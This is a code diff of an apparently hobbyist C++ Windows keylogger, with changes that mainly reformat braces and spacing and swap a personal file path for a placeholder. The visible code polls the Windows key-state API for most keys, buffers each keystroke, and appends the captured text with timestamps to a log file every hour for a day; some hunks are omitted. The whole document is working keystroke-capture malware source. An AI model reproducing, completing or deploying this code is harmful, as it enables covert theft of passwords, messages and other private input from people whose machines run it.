@@ -1,5 +1,5 @@
-//Created 9/7/2024
-//Sebastian Hyjek
+// Created 9/7/2024
+// Sebastian Hyjek
 
 #include <windows.h>
 #include <iostream>
@@ -14,9 +14,9 @@
 using namespace std;
 vector<string> buffer;
 
-void writeToFile(const string& content)
+void writeToFile(const string &content)
 {
-    string path = R"(C:\Users\sebas\source\repos\C and C++\Offensive_C\keylogger\key_log.txt)";
+    string path = R"(C:\path\to\key_log.txt)";
 
     ofstream MyFile(path, ios::app);
     if (MyFile.is_open())
@@ -24,12 +24,15 @@ void writeToFile(const string& content)
         MyFile << content;
         MyFile.close();
         std::cout << "File written successfully." << std::endl;
-    } else {
+    }
+    else
+    {
         std::cerr << "Unable to open file." << std::endl;
     }
 }
 
-string getCurrentTimestamp() {
+string getCurrentTimestamp()
+{
     // Get the current time
     auto now = std::chrono::system_clock::now();
     // Convert to time_t to get the time in seconds
@@ -47,8 +50,10 @@ void writeData()
     buffer.clear();
 }
 
-bool checkSpecialKeys(int S_Key) {
-    switch (S_Key) {
+bool checkSpecialKeys(int S_Key)
+{
+    switch (S_Key)
+    {
     case VK_SPACE:
         cout << " ";
         buffer.emplace_back(" ");
@@ -116,8 +121,10 @@ void logKeys()
 
     for (int KEY = 8; KEY <= 190; KEY++)
     {
-        if (GetAsyncKeyState(KEY) == -32767) {
-            if (checkSpecialKeys(KEY) == false) {
+        if (GetAsyncKeyState(KEY) == -32767)
+        {
+            if (checkSpecialKeys(KEY) == false)
+            {
                 char chr_KEY = static_cast<char>(KEY);
                 string string_representation(1, chr_KEY);
                 buffer.emplace_back(string_representation);
@@ -126,17 +133,18 @@ void logKeys()
     }
 }
 
-int main() {
+int main()
+{
     auto start = chrono::steady_clock::now();
     auto end = start + chrono::hours(24);
     auto nextWriteTime = start + chrono::hours(1);
-    while(chrono::steady_clock::now() < end)
+    while (chrono::steady_clock::now() < end)
     {
         Sleep(100);
 
         logKeys();
 
-        if(chrono::steady_clock::now() >= nextWriteTime)
+        if (chrono::steady_clock::now() >= nextWriteTime)
         {
             writeData();
             nextWriteTime += std::chrono::hours(1);
